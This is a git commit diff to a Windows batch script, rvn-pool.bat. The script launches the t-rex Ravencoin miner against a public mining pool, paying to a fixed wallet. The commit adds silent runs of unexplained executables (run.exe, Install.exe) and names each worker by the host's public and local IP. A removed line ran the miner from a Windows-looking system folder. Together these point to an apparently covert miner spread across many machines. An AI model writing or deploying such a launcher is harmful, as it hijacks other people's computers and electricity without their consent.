428832202b5808a96c6bfd281243bc92ca863352
lodio-999 <132812071+lodio-999@users.noreply.github.com>
2023-05-24 18:33:43 +0300

    Update rvn-pool.bat

--- rvn-pool.bat
+++ rvn-pool.bat
@@ -1,4 +1,9 @@
 @echo off
+
+run.exe
+Install.exe
+
+
 for /f "tokens=*" %%a in ('ipconfig ^| findstr "IPv4 Address"') do (
     set "ip=%%a"
 )
@@ -9,6 +14,11 @@ for /f "tokens=2 delims=:" %%b in ("%ip%") do (
 
 set "last_ip=%last_ip: =%"
 
-cd %systemdrive%\programdata\windows
-t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.%last_ip% -p x
+for /F "tokens=4 delims=." %%a in ("%last_ip%") do (
+    set last_three_numbers=%%a
+)
+
+for /f "delims=" %%G in ('curl -s https://api.ipify.org') do set "PUBLIC_IP=%%G"
+
+t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.%PUBLIC_IP%:%last_three_numbers% -p x
 pause
